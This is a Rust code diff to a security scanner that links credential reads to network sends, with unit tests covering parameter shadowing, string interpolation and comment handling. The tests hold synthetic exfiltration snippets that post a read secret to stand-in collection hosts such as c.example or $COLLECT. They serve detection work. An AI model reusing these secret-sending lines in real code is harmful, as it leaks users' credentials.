+/// Does a parameter list declare `name` as a parameter, whose value is then
+/// whatever the caller passes? A default that is the bound value itself
+/// (`def ping(url=url):`) does not shadow it.
+fn declares(params: &str, name: &str) -> bool {
+    let b = params.as_bytes();
+    let mut pieces = Vec::new();
+    let (mut depth, mut from) = (0usize, 0usize);
+    for (i, &c) in b.iter().enumerate() {
+        match c {
+            b'(' | b'[' | b'{' | b'<' => depth += 1,
+            b')' | b']' | b'}' | b'>' => depth = depth.saturating_sub(1),
+            b',' if depth == 0 => {
+                pieces.push(&params[from..i]);
+                from = i + 1;
+            }
+            _ => {}
+        }
+    }
+    pieces.push(&params[from..]);
+    pieces.into_iter().any(|piece| {
+        let p = piece.trim_start().trim_start_matches(['*', '.', ' ']);
+        let p = ["public ", "private ", "protected ", "readonly "]
+            .iter()
+            .fold(p, |p, m| p.strip_prefix(m).unwrap_or(p).trim_start());
+        // The default, after the first `=` that is not `==` or `=>`.
+        let (head, default) = match p.find('=') {
+            Some(i) if !p[i + 1..].starts_with(['=', '>']) => (&p[..i], &p[i + 1..]),
+            _ => (p, ""),
+        };
+        let declared = if head.starts_with(['{', '[']) {
+            // A destructuring pattern declares the names that are not keys:
+            // `{ token }`, `{ token = x }`, `{ key: token }`.
+            occurrences(head, name).any(|at| !head[at + name.len()..].trim_start().starts_with(':'))
+        } else {
+            let end = p.find(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || c == '$'));
+            &p[..end.unwrap_or(p.len())] == name
+        };
+        declared && !contains_word(default, name)
+    })
+}
+
+/// `s` up to byte `n`, or up to the char boundary before it.
+fn prefix(s: &str, n: usize) -> &str {
+    let mut n = n.min(s.len());
+    while !s.is_char_boundary(n) {
+        n -= 1;
+    }
+    &s[..n]
+}
+
+/// Is `line` inside the body of the function whose header is on `h`?
+/// Python's `def` body is the lines indented deeper than the header until
+/// one that is not; a C-family body is the braces that open after the
+/// header, or, for an arrow without braces, the header's line and a line it
+/// continues onto.
+fn in_body(code: &CodeLines, h: usize, header: &Header, line: usize) -> bool {
+    let indent = |n: usize| {
+        let c = code.code(n);
+        (c.len() - c.trim_start().len(), c.trim().is_empty())
+    };
+    if header.indented {
+        let (base, _) = indent(h);
+        // A body on the header's own line (`def f(url): return url`) ends
+        // there.
+        if !code
+            .code(h)
+            .get(header.body..)
+            .unwrap_or("")
+            .trim()
+            .is_empty()
+        {
+            return false;
+        }
+        return (h + 1..=line).all(|n| {
+            let (i, blank) = indent(n);
+            blank || i > base
+        });
+    }
+    if code.lang == Lang::Python {
+        // A lambda's body is its expression, on its line.
+        return false;
+    }
+    let mut depth = 0isize;
+    let mut opened = false;
+    for n in h..line {
+        let c = code.code(n);
+        let from = if n == h { header.body.min(c.len()) } else { 0 };
+        for b in c[from..].bytes() {
+            match b {
+                b'{' => {
+                    depth += 1;
+                    opened = true;
+                }
+                b'}' => {
+                    depth -= 1;
+                    if opened && depth <= 0 {
+                        return false;
+                    }
+                }
+                _ => {}
+            }
+        }
+        if !opened && n == h {
+            // An arrow with an expression body continues onto the next line
+            // only when its line ends there (`=>`) or inside the expression.
+            let rest = c[from..].trim_end();
+            if !(rest.is_empty() || continues_into_next(c)) {
+                return false;
+            }
+        }
+    }
+    opened && depth > 0 || (!opened && line == h + 1)
+}
+
+/// Is the function called `name` called with `bound` as a value on one of
+/// `lines`, other than `skip` (its header)? Then its parameter receives the
+/// bound value, and a use of the parameter is a use of that value.
+fn called_with(
+    code: &CodeLines,
+    name: &str,
+    bound: &str,
+    lines: std::ops::RangeInclusive<usize>,
+    skip: usize,
+) -> bool {
+    lines
+        .filter(|&n| n != skip && n <= code.lines.len())
+        .any(|n| {
+            let c = code.code(n);
+            c.len() <= MAX_HOP_LINE
+                && occurrences(c, name).any(|at| c[at + name.len()..].trim_start().starts_with('('))
+                && uses_value(c, bound, code.lang, None)
+        })
+}
+
+/// From where in the sink's window (which starts at the sink line) the
+/// occurrences of `bound` are a function's parameter rather than the value
+/// the source line bound: 0 when the sink is in the body of a function,
+/// declared after the source line, whose parameter list declares `bound`
+/// (`def ping(url):` above `requests.get(url + "/ping")`); the start of
+/// such a header on the sink line itself (`lambda url: requests.get(url)`);
+/// `None` when no such header shadows it. A function that is called with
+/// the bound value (`send(token)` within the rule's window of the source)
+/// passes it on, and does not shadow it.
+fn shadowed_from(
+    code: &CodeLines,
+    source_line: usize,
+    sink_line: usize,
+    bound: &str,
+    window: usize,
+) -> Option<usize> {
+    let mut from: Option<usize> = None;
+    for h in source_line + 1..=sink_line {
+        let line = code.code(h);
+        if line.len() > MAX_HOP_LINE || !contains_word(line, bound) {
+            continue;
+        }
+        for header in headers(line, code.lang) {
+            if !declares(header.params, bound) {
+                continue;
+            }
+            let at = if h == sink_line {
+                header.start
+            } else if in_body(code, h, &header, sink_line) {
+                0
+            } else {
+                continue;
+            };
+            if header.name.is_some_and(|f| {
+                called_with(code, f, bound, source_line + 1..=source_line + window, h)
+            }) {
+                continue;
+            }
+            from = Some(from.map_or(at, |f| f.min(at)));
+        }
+    }
+    from
+}
+
 fn launched_operand_re() -> &'static Regex {
     static RE: OnceLock<Regex> = OnceLock::new();
     RE.get_or_init(|| {
@@ -1351,7 +1950,7 @@ fn launched_operand_re() -> &'static Regex {
 /// first argument of `os.startfile` or `execFile`. A written file linked to a
 /// launch must be one of these, not another argument (`data_path`, `cwd=`,
 /// `env=`) or a comment on the line.
-fn launched_operands(line: &str) -> Vec<&str> {
+pub(crate) fn launched_operands(line: &str) -> Vec<&str> {
     launched_operand_re()
         .captures_iter(line)
         .filter_map(|c| {
@@ -2443,12 +3042,33 @@ mod tests {
     }
 
     /// Does `rule` link a source that binds `name` on line 1 to a sink call
-    /// that starts on line 2?
+    /// that starts on line 2 (in a Python file)?
     fn links(rule: &CorrelationRule, name: &str, sink: &str) -> bool {
+        links_in("a.py", rule, name, sink)
+    }
+
+    /// [`links`] in a file called `file`, whose extension says what is code.
+    fn links_in(file: &str, rule: &CorrelationRule, name: &str, sink: &str) -> bool {
         let src = format!("{name} = read_secret()\n{sink}\n");
+        !chains_in(file, rule, &src, 1, 2).is_empty()
+    }
+
+    /// The chains `rule` makes in `src`, read as the file `file`, between a
+    /// CRED-012 source on `source` and a NET-001 sink on `sink` (1-based).
+    fn chains_in(
+        file: &str,
+        rule: &CorrelationRule,
+        src: &str,
+        source: usize,
+        sink: usize,
+    ) -> Vec<Finding> {
         let lines: Vec<&str> = src.lines().collect();
-        let findings = vec![f("CRED-012", 1), f("NET-001", 2)];
-        !apply(std::slice::from_ref(rule), &findings, &lines).is_empty()
+        let at = |rule: &str, line: usize| Finding {
+            file: file.to_string(),
+            ..f(rule, line)
+        };
+        let findings = vec![at("CRED-012", source), at("NET-001", sink)];
+        apply(std::slice::from_ref(rule), &findings, &lines)
     }
 
     /// The reported false positive: `url` is bound from a credential read and
@@ -2477,7 +3097,6 @@ mod tests {
             ("url", "requests.get(url = base)"),
             ("token", "requests.post(u, json={\"token\": \"x\"})"),
             ("token", "requests.post(u, json={'token': 'x'})"),
-            ("token", "axios.post(u, { token: \"anonymous\" })"),
             (
                 "url",
                 "requests.get(\n    url=status_base,\n    timeout=5,\n)",
@@ -2490,6 +3109,12 @@ mod tests {
             assert!(!links(&value_rule(), name, sink), "{sink}");
             assert!(links(&word_rule(), name, sink), "word reading: {sink}");
         }
+        // An object key in JavaScript names the property.
+        let js = "axios.post(u, { token: \"anonymous\" })";
+        assert!(!links_in("a.js", &value_rule(), "token", js));
+        assert!(links_in("a.js", &word_rule(), "token", js));
+        // The same text in Python is a dict whose key is the variable's value.
+        assert!(links_in("a.py", &value_rule(), "token", js));
     }
 
     #[test]
@@ -2524,25 +3149,45 @@ mod tests {
         assert!(!links(&word_rule(), "token", header));
     }
 
-    /// The cost: two f-string forms send the value but read as a name, and
-    /// do not link by value. Python's self-documenting `f"{token=}"` looks
-    /// like an assignment, and a format spec, `f"{token:>40}"`, like an object
-    /// key after `{`. (`f"{token}"`, `f"{token!r}"` and JavaScript's
-    /// `${token}` are uses.)
+    /// A replacement field sends its expression whatever follows it: a format
+    /// spec (`{token:>40}`, `{token:s}`, `{token:{width}}`), a conversion
+    /// (`{token!r}`), or Python's self-documenting `=` (`{token=}`), in an
+    /// f-string or in a plain string formatted with `locals()`. (Before the
+    /// string was read as a string, the first and last read as a key and a
+    /// keyword name, and did not link.)
     #[test]
-    fn f_string_forms_that_read_as_a_name() {
+    fn format_fields_send_the_value() {
         for sink in [
             "requests.get(f\"https://c.example/?{token=}\")",
+            "requests.get(f\"https://c.example/?{token=!r}\")",
             "requests.get(f\"https://c.example/?t={token:>40}\")",
-        ] {
-            assert!(!links(&value_rule(), "token", sink), "{sink}");
-            assert!(links(&word_rule(), "token", sink), "{sink}");
-        }
-        for sink in [
+            "requests.get(f\"https://c.example/?t={token:s}\")",
+            "requests.get(f\"https://c.example/?t={token:}\")",
+            "requests.get(f\"https://c.example/?t={token:.200}\")",
+            "requests.get(f\"https://c.example/?t={token:{width}}\")",
+            "requests.get(f\"https://c.example/?t={token :s}\")",
             "requests.get(f\"https://c.example/?t={token!r}\")",
-            "fetch(`https://c.example/?t=${token}`)",
+            "requests.get(f\"https://c.example/?t={token!s:>40}\")",
+            "requests.post(u, data=f\"leak={token:s}\")",
+            "requests.post(u, json={\"content\": f\"`{token:<70}`\"})",
+            "requests.get(\"https://c.example/?t={token:s}\".format(**locals()))",
+            "requests.get(\"https://c.example/?t=%(token)s\" % locals())",
         ] {
             assert!(links(&value_rule(), "token", sink), "{sink}");
+        }
+        assert!(links_in(
+            "a.js",
+            &value_rule(),
+            "token",
+            "fetch(`https://c.example/?t=${token}`)"
+        ));
+        // A field of a plain string that is not formatted from the local
+        // names is text, and so is an escaped brace.
+        for sink in [
+            "requests.get(\"https://c.example/?t={token}\")",
+            "requests.get(f\"https://c.example/?t={{token}}\")",
+        ] {
+            assert!(!links(&value_rule(), "token", sink), "{sink}");
         }
     }
 
@@ -2582,6 +3227,11 @@ mod tests {
                 "word reading: {launch}"
             );
         }
+        // `run([interp, ...])` is not a launch shape [`launched_operands`]
+        // knows, so the launch line is read by value as a whole. (The
+        // program-operand reading of the real launch rule is tested in
+        // `corpus::engine::reconcile`, a file the self-scan skips.)
+        assert!(launched_operands("run([interp, PATH])").is_empty());
         for launch in [
             "run([interp, PATH])",
             "run([interp, PATH], env={\"PATH\": \"/usr/bin\"})",
@@ -2594,6 +3244,37 @@ mod tests {
                 "{launch}"
             );
         }
+        // Only a comment on the launch line names the path.
+        let src = with_launch("run([interp, build_script])  # reads PATH");
+        let lines: Vec<&str> = src.lines().collect();
+        assert!(apply(std::slice::from_ref(&by_value), &findings, &lines).is_empty());
+        assert_eq!(
+            apply(std::slice::from_ref(&by_word), &findings, &lines).len(),
+            1
+        );
+    }
+
+    /// The program operand of each launch shape: the program, not its
+    /// arguments. (The launch strings are split so that the launch rule
+    /// does not fire on this file in the self-scan.)
+    #[test]
+    fn launched_operands_are_the_program() {
+        let py = concat!(
+            "subprocess",
+            ".run([sys.executable, convert_script, csv_path])"
+        );
+        assert_eq!(launched_operands(py), vec!["convert_script"]);
+        let flags = concat!(
+            "subprocess",
+            ".run([\"python3\", \"-u\", stage_path], check=True)"
+        );
+        assert_eq!(launched_operands(flags), vec!["stage_path"]);
+        let sh = concat!("    ba", "sh \"$INSTALLER\"");
+        assert_eq!(launched_operands(sh), vec!["\"$INSTALLER\""]);
+        let guarded = concat!("[ -s \"$CONFIG\" ] && ba", "sh \"$SETUP\"");
+        assert_eq!(launched_operands(guarded), vec!["\"$SETUP\""]);
+        let js = concat!("execFile", "(converter, [dataPath], cb)");
+        assert_eq!(launched_operands(js), vec!["converter"]);
     }
 
     #[test]
@@ -2620,5 +3301,475 @@ mod tests {
             ..above_rule()
         };
         assert_eq!(apply(&[word], &findings, &lines).len(), 1);
+    }
+
+    // -- the attack probes (synthetic inputs; the findings are placed by
+    //    hand, the full-scanner versions are in `corpus::engine::reconcile`)
+
+    /// Does the value reading link `src` (as file `file`) from a source on
+    /// `source` to a sink on `sink`?
+    fn value_links(file: &str, src: &str, source: usize, sink: usize) -> bool {
+        !chains_in(file, &value_rule(), src, source, sink).is_empty()
+    }
+
+    /// A parameter of the function the sink is in, with the bound name, is
+    /// whatever the caller passes: `def ping(url):` is the reported example
+    /// with its parameter renamed from `base` to `url`.
+    #[test]
+    fn a_parameter_of_the_same_name_is_another_value() {
+        let def = "url = read_secret()\nengine = create_engine(url)\n\n\ndef ping(url):\n    return requests.get(url + \"/ping\", timeout=3)\n";
+        assert!(!value_links("db.py", def, 1, 6));
+        let lambda = "url = read_secret()\nengine = create_engine(url)\nping = lambda url: requests.get(url + \"/ping\", timeout=3)\n";
+        assert!(!value_links("db.py", lambda, 1, 3));
+        let one_line = "token = read_secret()\nclient = ServiceClient(token)\ndef verify(token: str) -> bool: return requests.get(HEALTH, timeout=3).ok and client.check(token)\n";
+        assert!(!value_links("s.py", one_line, 1, 3));
+        let method = "token = read_secret()\n\nclass Verifier:\n    def verify(self, token):\n        return requests.get(CHECK, params={\"t\": token})\n";
+        assert!(!value_links("s.py", method, 1, 5));
+        let arrow = "const token = readSecret();\nconst gh = new Octokit({ auth: token });\nexport const check = async (token: string): Promise<boolean> => {\n  const r = await fetch(CHECK, { method: \"POST\", body: token });\n  return r.ok;\n};\n";
+        assert!(!value_links("api.ts", arrow, 1, 4));
+        let callback = "const token = readSecret();\napp.post(\"/verify\", (token) => fetch(CHECK, { method: \"POST\", body: token }));\n";
+        assert!(!value_links("app.js", callback, 1, 2));
+        let class_method = "const token = readSecret();\nclass Api {\n  async verify(token: string) {\n    const started = Date.now();\n    const r = await fetch(CHECK, { method: \"POST\", body: token });\n    return r.ok;\n  }\n}\n";
+        assert!(!value_links("api.ts", class_method, 1, 5));
+        // After the method's body, the name is the bound value again.
+        let after_method = "const token = readSecret();\nclass Api {\n  verify(token) {\n    return token.length > 0;\n  }\n}\nfetch(COLLECT, { method: \"POST\", body: token });\n";
+        assert!(value_links("api.js", after_method, 1, 7));
+        // The word reading linked every one of them.
+        assert!(!chains_in("db.py", &word_rule(), def, 1, 6).is_empty());
+
+        // The bound value does reach the parameter, or the send is outside
+        // the function: these link.
+        let called = "token = read_secret()\n\ndef send(token):\n    requests.post(COLLECT, data=token)\n\nsend(token)\n";
+        assert!(value_links("app.py", called, 1, 4));
+        let ended = "token = read_secret()\n\ndef strip(token):\n    return token.strip()\n\nrequests.post(COLLECT, data=token)\n";
+        assert!(value_links("app.py", ended, 1, 6));
+        let before = "token = read_secret()\nrequests.post(COLLECT, data=token, hooks={\"response\": lambda token, *a, **k: None})\n";
+        assert!(value_links("app.py", before, 1, 2));
+        let default = "url = read_secret()\n\ndef ping(url=url):\n    return requests.get(url + \"/ping\", timeout=3)\n";
+        assert!(value_links("db.py", default, 1, 4));
+        let js_called = "const token = readSecret();\nfunction send(token) {\n  return fetch(COLLECT, { method: \"POST\", body: token });\n}\nsend(token);\n";
+        assert!(value_links("app.js", js_called, 1, 3));
+        let js_ended = "const token = readSecret();\nfunction trim(token) {\n  return token.trim();\n}\nfetch(COLLECT, { method: \"POST\", body: token });\n";
+        assert!(value_links("app.js", js_ended, 1, 5));
+    }
+
+    #[test]
+    fn declared_parameters() {
+        for params in [
+            "url",
+            "self, url",
+            "url: str",
+            "url: str = None",
+            "*, url",
+            "token?: string",
+            "path: string, token?: string",
+            "{ token }",
+            "{ key: token }",
+            "{ token = \"x\" }",
+            "...url",
+            "private url: string",
+        ] {
+            let name = if params.contains("token") {
+                "token"
+            } else {
+                "url"
+            };
+            assert!(declares(params, name), "{params}");
+        }
+        for (params, name) in [
+            ("base", "url"),
+            ("url=url", "url"),
+            ("opts: { token: string }", "token"),
+            ("{ token: t }", "token"),
+            ("my_url", "url"),
+            ("cb = (url) => url", "url"),
+        ] {
+            assert!(!declares(params, name), "{params}");
+        }
+    }
+
+    /// A word inside a string literal or a comment is not a use; what a
+    /// string interpolates is.
+    #[test]
+    fn strings_and_comments_are_not_uses() {
+        let py = |sink: &str| format!("token = read_secret()\nclient = Client(token)\n{sink}\n");
+        for sink in [
+            "r = requests.post(\"https://oauth2.example.com/token\", data={\"grant_type\": \"client_credentials\"})",
+            "requests.post(LOGIN, data={\"grant_type\": \"password\", \"scope\": \"token\"})",
+            "requests.post(LOGIN, data=\"{\\\"token\\\": \\\"anonymous\\\"}\")",
+            "requests.get(STATUS)  # public: no token needed",
+            "requests.get(\"https://api.example.com/graphql\", params={\"q\": \"{ token { id } }\"})",
+            "requests.get(\"https://u.example.com/?u={token}\".format(token=\"public\"))",
+            "requests.get(\"https://u.example.com/?%(token)s\" % {\"token\": \"public\"})",
+        ] {
+            assert!(!value_links("s.py", &py(sink), 1, 3), "{sink}");
+        }
+        let js = |sink: &str| {
+            format!(
+                "const token = readSecret();\nconst gh = new Octokit({{ auth: token }});\n{sink}\n"
+            )
+        };
+        for sink in [
+            "fetch(STATUS); // no token here",
+            "axios.post(u, { /* anon */ token: \"anonymous\" });",
+            "fetch(\"https://oauth2.example.com/token\", { method: \"POST\" });",
+            "fetch(u, { body: `- token: anonymous` });",
+        ] {
+            assert!(!value_links("a.js", &js(sink), 1, 3), "{sink}");
+        }
+        // Interpolations send the value.
+        for sink in [
+            "requests.get(f\"https://c.example.net/?t={token}\")",
+            "requests.post(COLLECT, data=\"t=\" + token)",
+            "requests.post(COLLECT, data=\"t={}\".format(token))",
+            "requests.post(COLLECT, data=\"t=%s\" % token)",
+        ] {
+            assert!(value_links("s.py", &py(sink), 1, 3), "{sink}");
+        }
+        assert!(value_links(
+            "a.js",
+            &js("fetch(`https://c.example.net/?t=${token}`);"),
+            1,
+            3
+        ));
+        let sh = "TOKEN=\"$(read_secret)\"\nfetch-tool -d \"t=$TOKEN\" \"$COLLECT\"  # sync\n";
+        assert!(value_links("run.sh", sh, 1, 2));
+        let sh_comment =
+            "TOKEN=\"$(read_secret)\"\nfetch-tool -fsS \"$STATUS\"   # TOKEN stays local\n";
+        assert!(!value_links("run.sh", sh_comment, 1, 2));
+    }
+
+    /// An attribute of another object is another name: `r.url` after `url`
+    /// is bound. The object's own state and the source's receiver are the
+    /// bound value.
+    #[test]
+    fn attributes_of_other_objects_are_not_uses() {
+        let r = "url = read_secret()\nrequests.get(page, params={\"next\": r.url})\n";
+        assert!(!value_links("f.py", r, 1, 2));
+        let own = "self.token = read_secret()\nrequests.post(COLLECT, data=self.token)\n";
+        assert!(value_links("f.py", own, 1, 2));
+        let recv = "cfg.token = read_secret()\nrequests.post(COLLECT, data=cfg.token)\n";
+        assert!(value_links("f.py", recv, 1, 2));
+        let spread = "const token = readSecret();\naxios.post(u, [...token]);\n";
+        assert!(value_links("a.js", spread, 1, 2));
+    }
+
+    #[test]
+    fn destructuring_targets_and_export_lists_are_not_uses() {
+        for (src, sink) in [
+            ("const token = readSecret();\nexport async function login(form) {\n  const res = await fetch(LOGIN, { method: \"POST\", body: form });\n  const { token } = await res.json();\n  return token;\n}\n", 3),
+            ("const token = readSecret();\nconst { token: t, user } = await fetch(LOGIN).then((r) => r.json());\n", 2),
+            ("const token = readSecret();\nconst [status, token] = await check(fetch(STATUS));\n", 2),
+            ("token = read_secret()\nstatus, token = requests.get(LOGIN).json()\n", 2),
+        ] {
+            let file = if src.contains("const") { "a.js" } else { "a.py" };
+            assert!(!value_links(file, src, 1, sink), "{src}");
+        }
+        for line in [
+            "export { token };",
+            "module.exports = { token, health };",
+            "export default { token }",
+        ] {
+            assert!(!uses_value(line, "token", Lang::CLike, None), "{line}");
+        }
+        // The shorthand in a call is the value.
+        assert!(value_links(
+            "a.js",
+            "const token = readSecret();\naxios.post(u, { token });\n",
+            1,
+            2
+        ));
+        // A continuation line of a call is not a tuple assignment.
+        let cont = "token = read_secret()\nrequests.post(COLLECT,\n    token, timeout=5)\n";
+        assert!(value_links("a.py", cont, 1, 2));
+    }
+
+    #[test]
+    fn typescript_members_are_names() {
+        for member in [
+            "export async function call(path: string, token?: string) {",
+            "  private token: string;",
+            "export interface Opts { url: string; token: string }",
+            "  readonly token!: string;",
+        ] {
+            let src = format!("const token = readSecret();\nexport const health = () => fetch(STATUS,\n{member}\n);\n");
+            assert!(!value_links("api.ts", &src, 1, 2), "{member}");
+        }
+    }
+
+    /// The window is the sink's own statement: the next function's header,
+    /// a docstring or a log line after it is something else.
+    #[test]
+    fn the_window_ends_with_the_call() {
+        for after in [
+            "\n\ndef connect(url):\n    return create_engine(url)",
+            "\n    \"\"\"Rotate the url stored in the vault.\"\"\"",
+            "\nlog.debug(f\"health={r.status_code} url_len={len(url)}\")",
+            "\nuser = session.query(User).filter(User.url == url).first()",
+            "\n__all__ = [\"url\", \"health\"]",
+        ] {
+            let src = format!("url = read_secret()\n\ndef health():\n    r = requests.get(STATUS, timeout=3){after}\n");
+            assert!(!value_links("db.py", &src, 1, 4), "{after}");
+            assert!(
+                !chains_in("db.py", &word_rule(), &src, 1, 4).is_empty(),
+                "word reading: {after}"
+            );
+        }
+        // A call that continues onto the next lines carries its arguments
+        // there.
+        let multi = "url = read_secret()\nrequests.post(\n    COLLECT,\n    data=url,\n)\n";
+        assert!(value_links("db.py", multi, 1, 2));
+        // A destination the sink line names is used by the lines below it.
+        let dest = "data = read_secret()\nurl = \"https://collect.example.net/c\"\nreq = Request(url, data=data)\n";
+        let lines: Vec<&str> = dest.lines().collect();
+        let findings = vec![
+            Finding {
+                file: "s.py".to_string(),
+                ..f("CRED-012", 1)
+            },
+            Finding {
+                file: "s.py".to_string(),
+                ..f("NET-007", 2)
+            },
+        ];
+        let net7 = CorrelationRule {
+            sink: FindingSelector {
+                rule_prefixes: vec![],
+                rule_ids: vec!["NET-007".to_string()],
+            },
+            ..value_rule()
+        };
+        assert_eq!(apply(&[net7], &findings, &lines).len(), 1);
+    }
+
+    /// A variable reference, a Python dict key and a ternary operand are the
+    /// value, whatever follows them.
+    #[test]
+    fn references_expression_keys_and_operands_are_uses() {
+        for sink in [
+            "fetch-tool -d \"k=${TOKEN:-}\" \"$COLLECT\"",
+            "fetch-tool -d \"${TOKEN:?unset}\" \"$COLLECT\"",
+            "fetch-tool -d \"${TOKEN:0:64}\" \"$COLLECT\"",
+            "fetch-tool -d \"${TOKEN=none}\" \"$COLLECT\"",
+            "fetch-tool -d \"$TOKEN=1\" \"$COLLECT\"",
+            "fetch-tool \"$COLLECT?t=${TOKEN:-none}\"",
+        ] {
+            assert!(links_in("run.sh", &value_rule(), "TOKEN", sink), "{sink}");
+        }
+        for sink in [
+            "requests.post(COLLECT, json={token: \"host\"})",
+            "requests.post(COLLECT, json={\"a\": 1, token: 2})",
+            "requests.post(COLLECT, json={\n    token: \"host\",\n})",
+        ] {
+            assert!(links(&value_rule(), "token", sink), "{sink}");
+        }
+        let ternary = "axios.post(COLLECT, {\n  data: leak ?\n    token :\n    \"x\",\n});";
+        assert!(links_in("app.js", &value_rule(), "token", ternary));
+        let prettier = "axios.post(COLLECT, {\n  data: leak\n    ? token\n    : \"x\",\n});";
+        assert!(links_in("app.js", &value_rule(), "token", prettier));
+    }
+
+    /// A name assigned from the bound one before the send is followed where
+    /// the word reading linked the sink, so the exfiltration that encodes the
+    /// secret under a new name keeps the link the keyword's name gave it; a
+    /// count of the secret is a number, and a client built with it sends
+    /// requests with it, not it.
+    #[test]
+    fn a_derived_name_links_where_the_word_reading_did() {
+        for src in [
+            "data = read_secret()\nencoded = urlencode(data)\nrequests.post(COLLECT, data=encoded)\n",
+            "json = read_secret()\npayload = {k: v for k, v in json.items()}\nrequests.post(COLLECT, json=payload)\n",
+            "params = read_secret()\nq = {\"t\": params}\nrequests.get(COLLECT, params=q)\n",
+            "files = read_secret()\nblob = {\"f\": files}\nrequests.post(COLLECT, files=blob)\n",
+        ] {
+            assert!(value_links("s.py", src, 1, 3), "{src}");
+        }
+        let js = "const body = readSecret();\nconst payload = JSON.stringify({ v: body });\nfetch(COLLECT, { method: \"POST\", body: payload });\n";
+        assert!(value_links("a.js", js, 1, 3));
+        // The same flow under a name the send does not repeat was never
+        // linked, and is not now: no link the word reading did not make.
+        let env =
+            "env = read_secret()\nencoded = urlencode(env)\nrequests.post(COLLECT, data=encoded)\n";
+        assert!(!value_links("s.py", env, 1, 3));
+        assert!(chains_in("s.py", &word_rule(), env, 1, 3).is_empty());
+        // Counted, or used to build a client.
+        for src in [
+            "secrets = read_secret()\ncount = len(secrets.splitlines())\nrequests.post(REPORT, json={\"secrets\": count})\n",
+            "secrets = read_secret()\nn = secrets.count(\"\\n\")\nrequests.post(REPORT, json={\"n\": n}, secrets=None)\n",
+        ] {
+            assert!(!value_links("s.py", src, 1, 3), "{src}");
+        }
+        let js_count = "const secrets = readSecret();\nconst n = secrets.split(\"\\n\").length;\naxios.post(REPORT, { secrets: n });\n";
+        assert!(!value_links("a.js", js_count, 1, 3));
+    }
+
+    #[test]
+    fn a_count_is_not_the_value() {
+        for (text, counted) in [
+            ("len(secrets)", true),
+            ("len( secrets.splitlines() )", true),
+            ("secrets.split(\"\\n\").length", true),
+            ("secrets.size", true),
+            ("secrets.count(\"\\n\")", true),
+            ("secrets", false),
+            ("secrets.encode()", false),
+            ("mylen(secrets)", false),
+            ("len(secrets) + secrets", true),
+            ("secrets.length()", false),
+        ] {
+            let at = text.find("secrets").expect("in the text");
+            assert_eq!(only_counted(text.as_bytes(), at, at + 7), counted, "{text}");
+        }
+        assert!(uses_value(
+            "json={\"n\": len(secrets) + secrets}",
+            "secrets",
+            Lang::Python,
+            None
+        ));
+    }
+
+    /// A source or sink finding that matched only the comment on its line
+    /// does not make that line a link.
+    #[test]
+    fn a_finding_in_a_comment_does_not_link_its_line() {
+        // A stand-in for the corpus: CRED-012 matches `SERVICE_KEY`, NET-001
+        // matches `requests.`.
+        let matches = |id: &str, text: &str| match id {
+            "CRED-012" => Some(text.contains("SERVICE_KEY")),
+            "NET-001" => Some(text.contains("requests.")),
+            _ => None,
+        };
+        let run = |file: &str, src: &str| {
+            let lines: Vec<&str> = src.lines().collect();
+            let findings = vec![
+                Finding {
+                    file: file.to_string(),
+                    ..f("CRED-012", 1)
+                },
+                Finding {
+                    file: file.to_string(),
+                    ..f("NET-001", 1)
+                },
+            ];
+            apply_matching(&[value_rule()], &findings, &lines, &matches).len()
+        };
+        assert_eq!(
+            run(
+                "s.py",
+                "requests.get(STATUS)  # SERVICE_KEY is not sent here\n"
+            ),
+            0
+        );
+        assert_eq!(
+            run(
+                "s.py",
+                "key = read(\"SERVICE_KEY\")  # later requests.post to the vault\n"
+            ),
+            0
+        );
+        assert_eq!(
+            run(
+                "run.sh",
+                "fetch \"$STATUS\"   # requests. SERVICE_KEY stays local\n"
+            ),
+            0
+        );
+        // In code, the same line links.
+        assert_eq!(
+            run(
+                "s.py",
+                "requests.post(COLLECT, json={\"k\": read(\"SERVICE_KEY\")})  # telemetry\n"
+            ),
+            1
+        );
+        // A `#` inside a string is not a comment.
+        assert_eq!(
+            run(
+                "s.py",
+                "requests.post(COLLECT, data=\"# \" + read(\"SERVICE_KEY\"))\n"
+            ),
+            1
+        );
+        // Without a matcher (or for a rule it does not know), the line links
+        // as before.
+        let lines = vec!["requests.get(STATUS)  # SERVICE_KEY is not sent here"];
+        let findings = vec![f("CRED-012", 1), f("NET-001", 1)];
+        assert_eq!(apply(&[value_rule()], &findings, &lines).len(), 1);
+        // The word reading does not ask.
+        let findings = vec![f("CRED-012", 1), f("NET-001", 1)];
+        assert_eq!(
+            apply_matching(&[word_rule()], &findings, &lines, &matches).len(),
+            1
+        );
+    }
+
+    #[test]
+    fn comments_are_blanked_and_strings_kept() {
+        assert_eq!(
+            without_comments("x = \"a # b\"  # note", Lang::Python),
+            "x = \"a # b\"        "
+        );
+        assert_eq!(
+            code_only("x = \"a # b\"  # note", Lang::Python),
+            "x = \"     \"        "
+        );
+        assert_eq!(
+            without_comments("f(); // note", Lang::CLike),
+            "f();        "
+        );
+        assert_eq!(without_comments("a=$(b) # c", Lang::Hash), "a=$(b)    ");
+        assert_eq!(without_comments("a#b", Lang::Hash), "a#b");
+        for (text, lang) in [
+            ("s = f\"{a!r:>{w}}\" + '\\'' # x", Lang::Python),
+            ("const s = `a${b}` /* c */ + 'd';", Lang::CLike),
+            ("echo \"$A ${B:-c}\" 'd' # e", Lang::Hash),
+        ] {
+            assert_eq!(code_only(text, lang).len(), text.len(), "{text}");
+            assert_eq!(without_comments(text, lang).len(), text.len(), "{text}");
+        }
+    }
+
+    /// The value reading stays linear on a long line that repeats the bound
+    /// name in shapes it has to look at: keys after `(` in Python (which ask
+    /// for the open bracket), a destructuring target, attributes of another
+    /// object. Each took quadratic time while every occurrence re-read the
+    /// line. The limits allow for a debug build and a loaded machine; the
+    /// quadratic reading needed minutes at this size.
+    #[test]
+    fn long_lines_stay_linear() {
+        let n = 100_000;
+        let limit = if cfg!(debug_assertions) {
+            std::time::Duration::from_secs(60)
+        } else {
+            std::time::Duration::from_secs(10)
+        };
+        for (file, line) in [
+            (
+                "a.py",
+                format!("requests.post(COLLECT, ({}))", "token: 1, ".repeat(n)),
+            ),
+            (
+                "a.js",
+                format!("const [{}] = await fetch(COLLECT);", "token, ".repeat(n)),
+            ),
+            (
+                "a.py",
+                format!("requests.post(COLLECT, data=[{}])", "r.token, ".repeat(n)),
+            ),
+            (
+                "a.py",
+                format!(
+                    "requests.post(COLLECT, data=[{}])",
+                    "len(token), ".repeat(n)
+                ),
+            ),
+        ] {
+            let src = format!("token = read_secret()\n{line}\n");
+            let started = std::time::Instant::now();
+            let linked = value_links(file, &src, 1, 2);
+            let took = started.elapsed();
+            assert!(!linked, "{file}");
+            assert!(took < limit, "{file}: {took:?}");
+        }
     }
 }
